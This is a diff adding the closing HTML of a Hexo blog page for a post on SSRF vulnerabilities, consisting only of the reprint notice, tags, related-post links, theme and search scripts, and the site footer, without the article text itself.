+                    <a href="https://shierjinghuang.github.io/2022/10/25/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/">https://shierjinghuang.github.io/2022/10/25/SSRF%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">十二惊惶</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
+                                </a>
+                            
+                                <a href="/tags/SSRF%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">SSRF漏洞</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/10/30/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B7%B1%E5%BA%A6%E6%8C%96%E6%8E%98/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="子域名深度挖掘">
+                        
+                        <span class="card-title">子域名深度挖掘</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-30
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                        <span class="chip bg-color">信息收集</span>
+                    </a>
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/09/08/%E7%AE%80%E5%8D%95%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%99%A8/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="计算机网络实训之简单文件传输系统器">
+                        
+                        <span class="card-title">计算机网络实训之简单文件传输系统器</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-08
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/" class="post-category">
+                                    项目设计
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%AE%9E%E8%AE%AD%E8%AE%B0%E5%BD%95/">
+                        <span class="chip bg-color">实训记录</span>
+                    </a>
+                    
+                    <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">
+                        <span class="chip bg-color">计算机网络</span>
+                    </a>
+                    
+                    <a href="/tags/FTP/">
+                        <span class="chip bg-color">FTP</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2025</span>
+            
+            <a href="/about" target="_blank">十二惊惶</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">166.4k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:572688347@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=572688347" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 572688347" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
